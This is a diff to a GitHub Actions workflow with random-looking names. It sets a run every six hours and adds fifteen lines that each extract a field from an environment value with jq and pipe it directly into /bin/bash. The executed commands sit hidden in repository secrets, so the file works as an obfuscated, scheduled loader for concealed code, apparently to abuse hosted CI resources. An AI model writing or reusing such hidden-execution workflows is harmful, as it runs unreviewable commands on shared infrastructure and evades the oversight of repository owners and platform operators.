@@ -3,22 +3,30 @@ name: tangtanteng5647
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 2/6 * * *'
-jobs:  # 28525
+    - cron: '6 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tangtanteng5647
         env:
-          v68: ${{ secrets.v68 }}
+          chhd36736: ${{ secrets.chhd36736 }}
         run: |
-          echo $v68 | jq -r .ebjru45811 | /bin/bash
-          echo $sq9 | jq -r .m929 | /bin/bash
-          echo $dngvp696 | jq -r .pl190 | /bin/bash
-          echo $yov965 | jq -r .wobtl87 | /bin/bash
-          echo $ehk5 | jq -r .nt74 | /bin/bash
-          echo $lxg252 | jq -r .fnek1142 | /bin/bash
-          echo $or7 | jq -r .omede072 | /bin/bash
+          echo $chhd36736 | jq -r .ia395 | /bin/bash
+          echo $ei6 | jq -r .jgf24 | /bin/bash
+          echo $eoo49 | jq -r .ay8 | /bin/bash
+          echo $b4924 | jq -r .k7 | /bin/bash
+          echo $p72 | jq -r .ca21245 | /bin/bash
+          echo $drz9 | jq -r .a4 | /bin/bash
+          echo $pdt033 | jq -r .xfst43 | /bin/bash
+          echo $woic10 | jq -r .pnv2447 | /bin/bash
+          echo $ngg17 | jq -r .i5 | /bin/bash
+          echo $ggqqc43976 | jq -r .y143 | /bin/bash
+          echo $ya08 | jq -r .zpavg96 | /bin/bash
+          echo $xvh35118 | jq -r .wdg87969 | /bin/bash
+          echo $ti99262 | jq -r .q400 | /bin/bash
+          echo $wudzl033 | jq -r .yra5464 | /bin/bash
+          echo $ky0 | jq -r .bm68973 | /bin/bash
 
